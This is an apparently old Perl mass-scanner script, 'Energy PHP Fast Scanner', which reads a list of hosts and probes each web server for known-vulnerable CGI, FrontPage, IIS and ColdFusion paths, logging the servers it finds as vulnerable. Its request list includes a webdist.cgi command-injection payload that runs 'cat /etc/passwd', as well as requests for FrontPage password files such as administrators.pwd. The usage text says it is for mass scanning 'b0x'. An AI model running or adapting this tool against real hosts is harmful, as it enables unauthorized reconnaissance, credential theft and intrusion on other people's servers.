

@scripts_w = ("GET /cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd HTTP/1.0\n\n",
"GET /_vti_bin/shtml.dll HTTP/1.0\n\n",
"GET /article.php HTTP/1.0\n\n",
"GET /_vti_bin/shtml.exe HTTP/1.0\n\n",
"GET /msadc/samples/adctest.asp HTTP/1.0\n\n");

@names_w = ("/cgi-bin",
"/_vti_bin",
"/article",
"/_vti_bin",
"/Webdist",
"/msadc.pl",
"/RDS");


######### Fast Scan - script must be edited in sub version if it is to be used ##########
@scripts_u = ("GET /_vti_inf.html HTTP/1.0\n\n","GET /_vti_pvt/service.pwd HTTP/1.0\n\n",
"GET /_vti_pvt/users.pwd HTTP/1.0\n\n","GET /_vti_pvt/authors.pwd HTTP/1.0\n\n",
"GET /_vti_pvt/administrators.pwd HTTP/1.0\n\n","GET /_vti_bin/shtml.dll HTTP/1.0\n\n",
"GET /_vti_bin/shtml.exe HTTP/1.0\n\n","GET /cgi-dos/args.bat HTTP/1.0\n\n",
"GET /cgi-win/uploader.exe HTTP/1.0\n\n","GET /cgi-bin/rguest.exe HTTP/1.0\n\n",
"GET /cgi-bin/wguest.exe HTTP/1.0\n\n","GET /scripts/issadmin/bdir.htr HTTP/1.0\n\n",
"GET /scripts/CGImail.exe HTTP/1.0\n\n","GET /scripts/tools/newdsn.exe HTTP/1.0\n\n",
"GET /scripts/fpcount.exe HTTP/1.0\n\n","GET /cfdocs/expelval/openfile.cfm HTTP/1.0\n\n",
"GET /cfdocs/expelval/exprcalc.cfm HTTP/1.0\n\n","GET /cfdocs/expelval/displayopenedfile.cfm HTTP/1.0\n\n",
"GET /cfdocs/expelval/sendmail.cfm HTTP/1.0\n\n","GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.0\n\n",
"GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.0\n\n","GET /msads/Samples/SELECTOR/showcode.asp HTTP/1.0\n\n",
"GET /search97.vts HTTP/1.0\n\n","GET /carbo.dll HTTP/1.0\n\n");
@names_u = ("_vti_inf.html   ","service.pwd     ","users.pwd       ","authors.pwd     ","administrators  ",
"shtml.dll       ","shtml.exe       ","args.bat        ","uploader.exe    ","rguest.exe      ",
"wguest.exe      ","bdir - samples  ","CGImail.exe     ","newdsn.exe      ","fpcount.exe     ",
"openfile.cfm    ","exprcalc.cfm    ","dispopenedfile  ","sendmail.cfm    ","codebrws.asp    ",
"codebrws.asp 2  ","showcode.asp    ","search97.vts    ","carbo.dll       ");
############################# Above code not used ###########################################


###############################################################
 $insecure = 0;
system "clear";
print "\n                Energy PHP Fast Scanner \n\n";
use IO::Socket;
my ($port, $sock,$server);
$size=0;
################################ SCAN ##########################
if(! $ARGV[0])
{
 &usage;
 exit;
} 

$port = $ARGV[2];
if(! $ARGV[2]) { $port = 80; }

open (HOSTFILE, "$ARGV[0]");
@hostfile = <HOSTFILE>;
chop(@hostfile);
$hostlength = @hostfile;
$hostcount = 0;

while ($hostcount < $hostlength) {
        print ("working on @hostfile[$hostcount]...\n");
$server = (@hostfile[$hostcount]);
        &connect;
        $hostcount++;
         }


print "Scanner dropper \n"; 

##########################################################
sub connect {
        #print "[Trying $server]\n";
	$sock = IO::Socket::INET->new(PeerAddr => $server,
				 	PeerPort => $port,
				 	Proto => 'tcp');
	if ($sock)	{
		print "[Connected to $server on $port]\n";
            $n=0;
            &version;
	    close(sock);
	      $size++;
      } else {
	
	}
}

###########################################################
sub version {
 $ver = "HEAD / HTTP/1.0\n\n";
  my($iaddr,$paddr,$proto);
$iaddr = inet_aton($server) || die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";
$proto = getprotobyname('tcp') || die "Error: $!";
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die "Error: $!";
connect(SOCK, $paddr) || die "Error: $!"; 
send(SOCK, $ver, 0) || die "Can't to send packet: $!";

# I do believe this should be taken out-------------------------
# However unhash below to activate interactive optional deep mode.

# print "[Server version is]:\n[##############################]\n";
# while(<SOCK>) 
# {
# print;
# } 
# print "[##############################]\n";
#  print "Would you like normal or deep scan?\n [Normal-1, Deep-2, or Quit-3]:";
# $n=0;
# chomp($type=<STDIN>);

# Note if above is unhashed these two lines must be hashed.
$n=0;
$type=1;


if($type eq 3)
 { print "Scan aborted!\n"; exit; }
 if($type eq 1)
  {
  foreach $scripts_w(@scripts_w)
{
	print "Searching for @names_w[$n] : ";
	$scw=$scripts_w;
      $name = @names_w[$n];
	&win_scan;
	$n++;
}	
  }
 else { 


foreach $scripts_u(@scripts_u)
{
	print "Searching for [@names_u[$n]] : ";
	$sc=$scripts_u;
      $name = @names_u[$n];
	&win2_scan;
	$n++;
}
  }
close(SOCK);
}
#################################################################
sub win_scan {
my($iaddr,$paddr,$proto);
$iaddr = inet_aton($server) || die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";
$proto = getprotobyname('tcp') || die "Error: $!"; 
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || &error("Failed to open socket: $!");
connect(SOCK, $paddr) || &error("Unable to connect: $!");
send(SOCK,$scw,0);

	$check=<SOCK>;
	($http,$code,$blah) = split(/ /,$check);
	if($code == 200)
	{
		
                print "[Found!]\n";
		open (OUT, ">>$ARGV[1]");
                print OUT ("$server - [@names_w[$n]] \n");
                close (OUT);
                $insecure++;
	}
	else
	{
		print "[Not Found]\n";

	}
	close(SOCK);
}

###############################################################
sub win2_scan {

 my($iaddr,$paddr,$proto);
$iaddr = inet_aton($server) || die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";
$proto = getprotobyname('tcp') || die "Error: $!"; 
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || &error("Failed to open socket: $!");
connect(SOCK, $paddr) || &error("Unable to connect: $!");
send(SOCK,$sc,0);

	$check=<SOCK>;
	($http,$code,$blah) = split(/ /,$check);
	if($code == 200)
	{
		print "[Found!]\n";
		$insecure++;
	}
	else
	{
		print "[Not Found]\n";

	}
	close(SOCK);
}

################################ USAGE ##########################
sub usage {
        system "clear";
        print "\n\n\n          Fast Scanner   \n\n";
       print "                   || by Energy ||  \n\n";
        print "Used to mass scan Windows,IRIX and Linux b0x\n\n";
	print "Usage: perl usdl.pl hostlist.txt logfile.txt [porta]\n\n";
	exit(0); }
################################ END   ##########################
print "[Test $size hosts $port e $insecure sites vulnerable]\n";

